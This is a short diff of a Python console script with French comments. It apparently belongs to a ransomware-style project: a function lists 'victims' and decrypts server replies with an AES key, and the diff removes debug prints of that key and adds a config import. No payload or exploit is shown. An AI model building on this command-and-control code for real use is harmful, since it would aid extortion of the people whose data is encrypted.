@@ -3,12 +3,12 @@ import utile.message
 import utile.network as network
 import utile.security as security
 import socket
+from utile import config as config
 
 # Constantes
 # IP_SERV_CONSOLE = '192.168.145.222'
 IP_SERV_CONSOLE = socket.gethostbyname(socket.gethostname())
 PORT_SERV_CONSOLE = 8380
-
 cle_aes = b''
 
 def print_victims_listing(client_socket):
@@ -58,8 +58,6 @@ def print_victims_listing(client_socket):
 
                     # Réception de la réponse suivante
                     confirmation_message = network.receive_message(client_socket)
-                    print("Messsage suivant :  (crypté)" + str(confirmation_message))
-                    print("Clé =" + str(cle_aes))
                     confirmation_message = security.aes_decrypt(confirmation_message, cle_aes)
                     print("Message suivant : " + str(confirmation_message))
                     msg_type = utile.message.get_message_type(confirmation_message)
